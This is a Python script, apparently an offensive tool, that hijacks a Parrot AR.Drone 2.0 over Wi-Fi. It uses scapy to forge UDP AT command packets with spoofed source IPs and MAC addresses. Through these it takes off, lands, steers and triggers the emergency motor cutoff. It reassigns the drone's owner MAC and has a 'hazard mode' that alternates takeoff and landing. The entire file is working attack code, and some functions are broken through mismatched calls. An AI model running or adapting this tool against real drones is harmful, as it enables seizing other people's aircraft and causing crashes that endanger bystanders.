

import os, time, sys
import random
from scapy.all import *
import socket
import sys, tty, termios
import uuid
import netifaces

STARTING_INDEX = 0
SIZE           = 70
MACS = [
    "00:04:ff:ff:ff:a6",  
    '00:04:ff:ff:ff:d0',
    "00:1f:ff:ff:ff:9c",
    "00:04:ff:ff:ff:c9",
    "bc:f5:ff:ff:ff:93",
    "00:04:ff:ff:ff:57",
    "20:4e:ff:ff:ff:30",
    "a0:b3:ff:ff:ff:7e",
    "00:04:ff:ff:ff:b9",
    "00:22:ff:ff:ff:af",
    "60:be:ff:ff:ff:e0",
    "ec:1a:59:61:07:b2",
    "90:59:af:3d:6d:bc",
    "3c:97:0e:48:22:12",
    "00:18:31:87:8f:b0",
    "00:ff:88:5f:fd:f0",
    "38:60:77:29:31:36",
    "4c:72:b9:7c:bb:7e",
    "12:6c:50:55:2e:0e",
    "53:12:dd:c3:7b:d7",
    "d3:cb:24:f2:30:1b",
    "d6:c6:98:c1:e7:64",
    "de:58:e4:da:38:ab",
    "93:01:25:23:27:58",
    "83:66:24:bd:05:4e",
    "99:91:41:e4:50:1f",
    "0f:a4:07:c9:5c:40",
    "59:68:06:80:84:33",
    "53:e9:4a:97:70:a7",
    "10:2f:c1:87:56:24",
    "12:5a:c2:75:c7:d0",
    "8b:4d:09:7b:dc:61",
    "ec:f7:83:71:7c:52",
    "d4:13:50:2a:cd:1a",
    "1e:eb:9f:18:b1:8c",
    "6e:6e:10:20:8a:1b",
    "61:94:68:e1:ca:85",
    "a0:40:ab:3f:b9:a9",
    "2a:a1:18:25:ac:f5",
    "ee:98:ad:fa:b2:0f",
    "b1:4e:09:b1:ed:eb",
    "54:a3:68:43:2e:60",
    "65:bc:22:1f:ad:68",
    "c4:ad:7f:34:0f:62",
    "bb:2a:ee:90:23:cf",
    "86:ca:18:1e:eb:78",
    "38:a8:fa:57:05:53",
    "af:6a:13:77:3e:4b",
    "3b:39:87:a8:67:53",
    "c3:93:52:6e:8e:bb",
    "09:46:7b:04:eb:8d",
    "df:c1:93:90:3f:ef",
    "74:df:7f:6d:fe:dd",
    "10:e3:f7:8a:74:7a",
    "1a:65:b3:98:97:4d",
    "d3:ef:05:98:cc:57",
    "16:4c:81:48:68:eb",
    "28:66:99:47:0a:bc",
    "97:5d:bd:27:de:21",
    "1e:44:5c:d5:9d:20",
    "a1:76:a6:d2:fe:d1",
    "27:94:e5:b5:46:0e",
    "33:6f:72:a6:6b:44",
    "56:00:29:77:88:d7",
    "ba:11:ed:31:83:38",
    "75:f3:e4:f0:1c:25",
    "80:98:29:05:c5:32",
    "6c:f8:99:82:66:f4",
    "d3:3c:c0:02:10:18",
    "62:91:83:83:81:a0"
]


seqno             = 4611686018427387904
ENDING_REF        = 9223372036854775807
starting_ref      = ENDING_REF - 500
change_mac_inc    = 10000
LANDING_COMMAND   = 290717696
EMERGENCY_COMMAND = 290717952
TAKEOFF_COMMAND   = 290718208

INTERNET_DOWN_COMMAND = 'sudo ifconfig en0 down'
INTERNET_UP_COMMAND   = 'sudo ifconfig en0 up'
CHANGE_MAC_COMMAND    = 'sudo ifconfig en0 ether '
WIFI_CONNECT_COMMAND  = 'sudo networksetup -setairportnetwork en0 '
DESIRED_NETWORK       = '"ardrone2_014562"'

attack_mode = False
address = ('192.168.1.1',5556)
seqno = 1
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("", 5554))
IP_source = '192.168.1.2' # spoofed source IP address
IP_dest = '192.168.1.1' # destination IP address
Port_source = 5554 # source port
Port_dest = 5556 # destination 
interface = "eth0"
IPs = [ "192.168.1.2", "192.168.1.3", "192.168.1.4", "192.168.1.5" ]
offsets = ( 8, 20 )


def sendCommand( cmd ):
    global address
    global seqno
    global s
    #rint "DEBUG: Sending:  '%s'" % cmd.strip()
    s.sendto(cmd,address)
    seqno += 1

def is_interface_up( interface ):
    addr = netifaces.ifaddresses(interface)
    return netifaces.AF_INET in addr

def randomMAC():

    global STARTING_INDEX
    global attack_mode
    STARTING_INDEX += 1
    
    #Return from index
    if not attack_mode:
        return MACS[ STARTING_INDEX % SIZE ]

    mac = [ 
        random.randint(0x00, 0x7f), 
        random.randint(0x00, 0x7f), 
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) ]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def connectToWifi( network ):
    os.system( WIFI_CONNECT_COMMAND + network )

def changeMAC( newMac ):
    global seqno
    os.system( CHANGE_MAC_COMMAND + newMac )
    print( CHANGE_MAC_COMMAND + newMac )
    time.sleep(3)
    seqno += change_mac_inc

def changeDroneOwner( seqno, newMac, oldMac ):
    command = """AT*CONFIG=%d,"network:owner_mac","%s"\r""" % ( seqno, newMac )
    _spoof_command( command, oldMac )

def getChar():
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(sys.stdin.fileno())
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return ch

def _spoof_command( f_command, mac ):
    for ip in IPs:
        datalength = len( f_command ) + offsets[ 0 ]
        s_packet = Ether( src = mac ) / IP( dst = "192.168.1.1", src = ip, len = datalength + offsets[1] )/ UDP( sport = 5554, dport = 5556, len = datalength ) / f_command
        sendp( s_packet )

def spoof_command( ref, command, mac ):
    global IPs
    cmd = "AT*REF=%d,%d\r" % ( ref, command )

    #for i in xrange( ref, ENDING_REF)
    _spoof_command( cmd, mac )

def reset( mac ):
    global seqno
    seqno = 1
    for i in xrange(1,25):
        _spoof_command("AT*FTRIM=%d\r" % seqno, mac )

def hazardMode( starting, end ):

    for i in xrange( starting, end + 1 ):

        if i % 2 == 1: 
            spoof_command( i, LANDING_COMMAND )
            time.sleep( 2 )
        else:
            spoof_command( i, TAKEOFF_COMMAND )
            time.sleep( 5 )

#movement with full power
negNumber = -1082130432
posNumber = 1065353216
negativeIndex = 0
positiveIndex = 4
posValueIndex = [0, 1048576000, 1056964608, 1061158912, 1065353216]
negValueIndex = [-1082130432, -1086324736, -1090519040, -1098907648, 0] 
mode = 1

#movement controls
def forward( mac ):
   global seqno
   global mode
   negNumber = negValueIndex[ negativeIndex ]
   for i in xrange(1,25):
        _spoof_command("AT*PCMD=%d,%d,%d,%d,%d,%d\r" % (seqno, mode, 0, negNumber,0, 0), mac )
        #LeftRight,ForwardBackward,UpDown,Turn

def backward( mac ):
   global seqno
   global mode
   posNumber = posValueIndex[ positiveIndex ]
   for i in xrange(1,25):
        _spoof_command("AT*PCMD=%d,%d,%d,%d,%d,%d\r" % (seqno, mode, 0, posNumber,0, 0), mac )
        #LeftRight,ForwardBackward,UpDown,Turn

def left( mac ):
   global seqno
   global mode
   negNumber = negValueIndex[ negativeIndex ]
   for i in xrange(1,25):
        spoof_command("AT*PCMD=%d,%d,%d,%d,%d,%d\r" % (seqno, mode, negNumber, 0,0, 0), mac )
        #LeftRight,ForwardBackward,UpDown,Turn


def right( mac ):
   global seqno
   global mode
   posNumber = posValueIndex[ positiveIndex ]
   for i in xrange(1,25):
        spoof_command("AT*PCMD=%d,%d,%d,%d,%d,%d\r" % (seqno, mode, posNumber, 0,0, 0), mac )
        #LeftRight,ForwardBackward,UpDown,Turn

def rightturn( mac ):
    global seqno
    global mode
    posNumber = posValueIndex[ positiveIndex ]
    for i in xrange(1,25):
        spoof_command("AT*PCMD=%d,%d,%d,%d,%d,%d\r" % (seqno, mode, 0, 0, 0, posNumber), mac )
        #LeftRight,ForwardBackward,UpDown,Turn

def leftturn( mac ):
    global seqno
    global mode
    negNumber = negValueIndex[ negativeIndex ]
    for i in xrange(1,25):
        spoof_command("AT*PCMD=%d,%d,%d,%d,%d,%d\r" % (seqno, mode, 0, 0, 0, negNumber), mac )
        #LeftRight,ForwardBackward,UpDown,Turn

def up( mac ):
    global seqno
    global mode
    posNumber = posValueIndex[ positiveIndex ]
    for i in xrange(1,25):
        spoof_command("AT*PCMD=%d,%d,%d,%d,%d,%d\r" % (seqno, mode, 0, 0, posNumber, 0,), mac )
        #LeftRight,ForwardBackward,UpDown,Turn

def down( mac ):
    global seqno
    global mode
    negNumber = negValueIndex[ negativeIndex ]
    for i in xrange(1,25):
        spoof_command("AT*PCMD=%d,%d,%d,%d,%d,%d\r" % (seqno, mode, 0, 0, negNumber, 0), mac )
        #LeftRight,ForwardBackward,UpDown,Turn

def toggleEmergencyMode():
    global seqno
    global mode
    shutdown_cmd = setBits([8])
    print(shutdown_cmd)
    sendCommand("AT*REF=%d,%d\r" % (seqno,shutdown_cmd))         

def printUsage():
    print ("\n\n")
    print ("Keyboard commands:")
    print ("\tq       - quit")
    print ("\tl       - land")
    print ("\tt       - takeoff")
    print ("\tw       - forward")
    print ("\ts       - backward")
    print ("\td       - right")
    print ("\ta       - left")
    print ("\tu       - up")
    print ("\tj       - down")
    print ("\th       - turn right")
    print ("\tk       - turn left")
    print ("\th       - hazard mode")
    print ("\tm       - change mac")
    print ("\tc       - connect to Drone")
    print ("\t(space) - emergency shutoff")

#Set the starting mac
currentMac = MACS[ STARTING_INDEX ]
print( currentMac )

#Call after every spoof message call
def updateMac( ):
    global currentMac
    global seqno
    newMac = randomMAC( )
    changeDroneOwner( seqno, newMac, currentMac )
    currentMac = newMac
    changeMAC( newMac )

def main():
    global attack_mode
    global seqno
    global currentMac
    global STARTING_INDEX

    #Setting index
    if len( sys.argv ) > 1:
        STARTING_INDEX = int( sys.argv[ 1 ] )
        currentMac = MACS[ STARTING_INDEX ]
    
    #Init attack mode
    if len( sys.argv ) > 2 and argv[ 2 ].lower( ) == 'a':
        attack_mode = True
        seqno = starting_ref
        change_mac_inc = 100
        
    #init seqno
    if len( sys.argv ) > 3:
        seqno = int( sys.argv[ 3 ] )
        
        
    print( "CURRENT MAC: " + currentMac + " INDEX: " + str( STARTING_INDEX ) )
    while True:
        printUsage()
        ch = getChar()
        if ch == 'q':
            a = 'b'
            if attack_mode:
                a = 'a'
            print( currentMac + " " + a + " " + seqno )
            exit(0)
        elif ch == 'l':
            spoof_command( seqno, LANDING_COMMAND, currentMac )
            seqno += 1
        elif ch == 'r':
            reset( )
        elif ch == 't':
            spoof_command( seqno, TAKEOFF_COMMAND, currentMac )
            seqno += 1
        elif ch == 'w':
            forward( currentMac )
        elif ch == 's':
            backward( currentMac )
        elif ch == 'd':
            right( currentMac )
        elif ch == 'a':
            left( currentMac )
        elif ch == 'u':
            up( currentMac )
        elif ch == 'j':
            down( currentMac )
        elif ch == 'h':
            leftturn( currentMac )
        elif ch == 'k':
            rightturn( currentMac)
        elif ch == 'm':
            print( "CURRENT MAC: " + currentMac + " INDEX: " + str( STARTING_INDEX ) )
            updateMac( )
            print( "NEW MAC: " + currentMac + " INDEX: " + str( STARTING_INDEX ) )
        elif ch == ' ':
            spoof_command( seqno, EMERGENCY_COMMAND, currentMac )
            seqno += 1
        elif ch == 'h':
            hazardMode( ENDING_REF - 20, ENDING_REF )
        elif ch == 'c':
            connectToWifi( DESIRED_NETWORK )
        elif ch == 'r':
            reset( currentMac )
        else:
            print ("Invalid command!")

try:
    main()
except:
    a = 'b'
    if attack_mode:
        a = 'a'
    print( currentMac + " " + a + " " + seqno )
